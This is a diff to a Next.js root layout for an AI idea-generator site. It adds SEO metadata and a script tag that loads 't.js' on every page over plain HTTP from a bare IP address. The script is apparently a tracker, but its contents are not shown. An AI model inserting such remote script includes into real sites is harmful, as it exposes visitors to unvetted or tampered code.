@@ -1,4 +1,5 @@
 import type { Metadata } from 'next'
+import Script from 'next/script'
 import './globals.css'
 import SharedNavbar from '@/components/SharedNavbar'
 import SharedFooter from '@/components/SharedFooter'
@@ -20,6 +21,7 @@ export const metadata: Metadata = {
   title: 'IdeaAgent — AI-powered SaaS idea generator',
   description: 'AI agent scans real market trends and surfaces actionable, monetizable SaaS business ideas for solo developers and indie hackers.',
   keywords: ['SaaS ideas', 'startup ideas', 'AI business ideas', 'indie hacker', 'market trends'],
+  metadataBase: new URL('https://idea-agent.vercel.app'),
   openGraph: { title: 'IdeaAgent — AI SaaS idea generator', description: 'AI scans trends and surfaces profitable startup ideas.', type: 'website', locale: 'en_GB', siteName: 'IdeaAgent' },
   twitter: { card: 'summary_large_image', title: 'IdeaAgent', description: 'AI-powered SaaS idea generator.' },
   robots: { index: true, follow: true },
@@ -43,6 +45,7 @@ export default function RootLayout({ children }: { children: React.ReactNode }) 
         <main className="flex-1 pt-16">{children}</main>
         <SharedFooter brand={brand} />
         <FloatingChatWrapper />
+        <Script defer data-site="idea-agent.vercel.app" src="http://31.97.56.148:3098/t.js" strategy="afterInteractive" />
       </body>
     </html>
   )
